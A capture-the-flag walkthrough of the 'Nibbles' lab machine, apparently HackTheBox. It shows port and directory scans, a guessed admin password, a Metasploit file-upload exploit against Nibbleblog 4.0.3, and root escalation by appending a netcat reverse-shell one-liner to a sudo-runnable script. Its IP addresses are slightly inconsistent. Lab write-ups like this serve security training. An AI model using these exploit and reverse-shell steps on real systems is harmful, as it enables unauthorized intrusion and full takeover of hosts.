```shell
nmap -sV -sC -oA nibbles 10.129.37.246 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 13:05 EDT
Nmap scan report for 10.129.37.246
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.84 seconds
```

We go to the site which runs at port 80:

![](../attachments/Pasted%20image%2020251011203415.png)

and seeing the source code:
![[Pasted image 20251011203507.png]]

so we go to the directory: 10.129.37.146/nibbleblog

![](../attachments/Pasted%20image%2020251011203558.png)

We run a `gobuster`
```shell
gobuster dir -u http://10.129.37.246/nibbleblog/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.37.246/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402]
/content              (Status: 301) [Size: 327] [--> http://10.129.37.246/nibbleblog/content/]
/themes               (Status: 301) [Size: 326] [--> http://10.129.37.246/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 302]
/admin                (Status: 301) [Size: 325] [--> http://10.129.37.246/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.37.246/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 329] [--> http://10.129.37.246/nibbleblog/languages/]
```

In exploring the resulting paths, `/nibbleblog/content` is interesting, and has dir lists enabled. Digging deeper, there's page at `/nibbleblog/content/private/users.xml`

![](../attachments/Pasted%20image%2020251011231153.png)

We go to the path`/admin.php` that we found with `gobuster` earlier:

![](../attachments/Pasted%20image%2020251011231322.png)

We use as username `admin` , but we don't know the password and it doesn't have a default password like admin, or password. Also again, by looking at the `users.xml` we see that there is a black list protection. So we can't login brute-force with a tool like `Hydra`.

Anyway, from all the videos and walkthroughs that I saw they just guessed the password. The password is `nibbles` and we continue on.

From the `gobuster` results, there's a README file, and that gives us a version:
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
...
```

We do a `searchsploit` and we find a vulnerability for this version of nibbleblog:
```shell
searchsploit nibbleblog
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                          | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                           | php/remote/38489.rb
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

So we open `metasploit`:

![](../attachments/Pasted%20image%2020251013110227.png)

We configures the info that we need:
```shell
msf exploit(multi/http/nibbleblog_file_upload) > set RHOST 10.129.141.145
RHOST => 10.129.141.145
msf exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
TARGETURI => /nibbleblog
msf exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
```
Also this is very important I needed to change the LHOST to the IP address of the VPN address otherwise it wouldn't work:
```shell
set LHOST 10.10.14.158
LHOST => 10.10.14.158
msf exploit(multi/http/nibbleblog_file_upload) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.158:4444 
[*] Sending stage (40004 bytes) to 10.129.141.145
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.158:4444 -> 10.129.141.145:59074) at 2025-10-13 04:17:11 -0400

meterpreter > shell
Process 1485 created.
Channel 0 created.
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

From there, we'll upgrade our shell:
```shell
python -c 'import pty;pty.spawn("/bin/bash")' 
/bin/sh: 1: python: not found 
python3 -c 'import pty;pty.spawn("/bin/bash")' nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home 
nibbler@Nibbles:/home$ ls nibbler nibbler@Nibbles:/home$ cd nibbler nibbler@Nibbles:/home/nibbler$ ls 
personal.zip user.txt 
nibbler@Nibbles:/home/nibbler$ wc -c user.txt 
33 user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
79c03865431abf47b90ef24b9695e148
```

For privilege escalation, we will first type:
```shell
nibbler@Nibbles:/home/nibbler$ sudo -l

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```shell
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  

```

The nibbler can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we can append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user.
The one-liner is in this site: `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` [source](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```shell
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

	`It is crucial if we ever encounter a situation where we can leverage a writeable file for privelege escalation, we only append to the end of the file to avoid overwriting it and causing a disruption.`

We execute the script with `sudo`:
```shell
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
```

On the kali machine, we open a terminal and write:
```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 8443             
listening on [any] 8443 ...
```

```shell
connect to [10.10.14.158] from (UNKNOWN) [10.129.141.145] 38182
# id
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@Nibbles:/home# ls 
ls
nibbler
root@Nibbles:/home# cd /root
cd /root
root@Nibbles:~# ls
ls
root.txt
root@Nibbles:~# cat root.txt
cat root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

Also you should check [GTFOBins](https://gtfobins.github.io/) for more post exploitation techniques.

